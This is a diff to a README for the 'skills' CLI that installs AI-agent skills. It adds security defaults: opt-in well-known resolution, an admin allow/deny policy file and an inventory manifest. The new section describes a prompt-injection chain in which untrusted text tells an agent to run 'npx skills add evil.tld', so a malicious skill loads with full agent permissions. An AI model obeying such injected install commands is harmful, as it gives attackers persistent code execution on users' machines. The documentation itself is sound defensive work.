@@ -49,6 +49,7 @@ npx skills add ./my-local-skills
 | `--copy`                  | Copy files instead of symlinking to agent directories                                                                                              |
 | `-y, --yes`               | Skip all confirmation prompts                                                                                                                      |
 | `--all`                   | Install all skills to all agents without prompts                                                                                                   |
+| `--allow-well-known`      | Allow installing from a `.well-known/agent-skills` endpoint on an arbitrary HTTPS host. **Off by default**, see [Security defaults](#security-defaults).         |
 
 ### Examples
 
@@ -492,6 +493,113 @@ Telemetry is automatically disabled in CI environments.
 - [Roo Code Skills Documentation](https://docs.roocode.com/features/skills)
 - [Trae Skills Documentation](https://docs.trae.ai/ide/skills)
 - [Vercel Agent Skills Repository](https://github.com/vercel-labs/agent-skills)
+
+## Security defaults
+
+`skills add` is the entry point for executable content that an LLM agent
+will subsequently load with full agent permissions. The CLI applies two
+defenses by default and exposes a policy file for fleet admins.
+
+### Well-known resolution is opt-in
+
+`npx skills add` accepts bare HTTPS hostnames (e.g. `npx skills add example.com`)
+and probes `https://<host>/.well-known/agent-skills/index.json` for a
+catalog. **As of this version that probe is disabled by default.** The
+attack chain it forecloses:
+
+1. An LLM agent processes untrusted text (web page, email, doc, search result).
+2. The text contains a prompt injection telling the agent to run
+   `npx skills add evil.tld`.
+3. The CLI resolves it via well-known, fetches `SKILL.md` from `evil.tld`.
+4. On next activation, the agent loads the malicious skill with full agent
+   permissions. Persistent indirect RCE.
+
+To install from a well-known endpoint:
+
+```bash
+# Per-command:
+npx skills add skills.acme.corp --allow-well-known
+
+# Per-user (creates ~/.agents/skills-policy.json):
+# { "version": 1, "providers": { "well_known": "allow" } }
+```
+
+### Policy file (admin-managed)
+
+The CLI loads a policy file from the first hit of:
+
+1. `$SKILLS_POLICY` (absolute path)
+2. `<cwd>/.skills-policy.json`
+3. `~/.agents/skills-policy.json`
+
+Schema:
+
+```jsonc
+{
+  "version": 1,
+  "default": "allow",               // applies to every provider unless overridden
+  "providers": {                    // per-provider overrides
+    "well_known": "deny",           //   any of: "allow" | "deny" | "proxy_only"*
+    "github":     "allow",
+    "gitlab":     "allow",
+    "git":        "deny",
+    "local":      "allow"
+  },
+  "allow_sources": ["github.com/acme-corp/*"],
+  "deny_sources": ["github.com/sketchy-org/*"],
+  "proxy": "https://artifactory.corp/agent-skills"  // reserved; see below
+}
+```
+
+Evaluation precedence (first match wins):
+
+1. `deny_sources` match  → deny
+2. `allow_sources` match → allow
+3. `providers[<id>]`      → cascade winner
+4. `default`              → cascade winner
+5. built-in default       → allow, except `well_known` which is default-deny
+
+Glob syntax: `*` matches any run of non-slash characters, `**` matches
+anything. Source identifier format is `<host>/<owner>/<repo>` for hosted
+providers, `<host><path>` for well-known, `local` for local paths.
+
+> `proxy_only` is parsed in v1 but rejected with a forward-looking error.
+> Actual URL rewriting through a configured proxy lands in a follow-up PR.
+
+For an air-gapped fleet pointed at an internal mirror that already filters
+content, a one-liner policy suffices:
+
+```jsonc
+{ "version": 1, "default": "deny", "allow_sources": ["artifactory.corp/*"] }
+```
+
+### Inventory manifest (`~/.agents/skills-inventory.json`)
+
+On every successful `add`, `remove`, and `update`, the CLI writes a
+machine-readable record of installed skills to `~/.agents/skills-inventory.json`.
+The format is stable and intended for fleet-management consumption (Intune
+detection scripts, JAMF extension attributes, osquery, Munki, etc.):
+
+```jsonc
+{
+  "version": 1,
+  "updated_at": "2026-05-25T12:00:00Z",
+  "skills": [
+    {
+      "name": "frontend-design",
+      "source": "github.com/vercel-labs/agent-skills",
+      "ref": "main",
+      "scope": "global",
+      "installed_at": "...",
+      "provider_id": "github"
+    }
+  ]
+}
+```
+
+Distinct from `skills-lock.json` (per-project, tracks resolution graph) —
+the inventory is per-user-global and tracks effective installed state
+across scopes.
 
 ## License
 
